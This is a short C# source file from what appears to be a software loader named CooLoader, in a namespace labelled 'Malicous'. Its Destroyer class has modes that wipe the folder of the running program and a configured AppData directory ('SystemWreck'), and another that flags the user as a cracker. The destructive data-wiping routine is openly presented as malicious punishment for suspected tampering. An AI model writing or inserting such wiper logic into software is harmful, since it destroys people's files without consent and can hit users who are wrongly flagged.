using System.IO;
using System.Reflection;
using CooLoader.Util.Checking;

namespace CooLoader.Util.Malicous
{
    internal class Destroyer
    {
        private DestroyerType _type;

        public enum DestroyerType
        {
            FolderWipe,
            CrackerTag,
            SystemWreck
        } ;

        public Destroyer(DestroyerType type)
        {
            _type = type;
        }

        public void Destroy()
        {
            switch (_type)
            {
                case DestroyerType.FolderWipe:
                    DirectoryWiper w = new DirectoryWiper(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));  
                    w.Wipe();
                    break;
                case DestroyerType.CrackerTag:
                    CrackerCheck.FlagCracker();
                    break;
                case DestroyerType.SystemWreck:
                    DirectoryWiper w2 = new DirectoryWiper(Configuration.AppData);  
                    w2.Wipe();
                    break;
                default:
                    _type = DestroyerType.CrackerTag;
                    Destroy();
                    return;
            }
        }
    }
}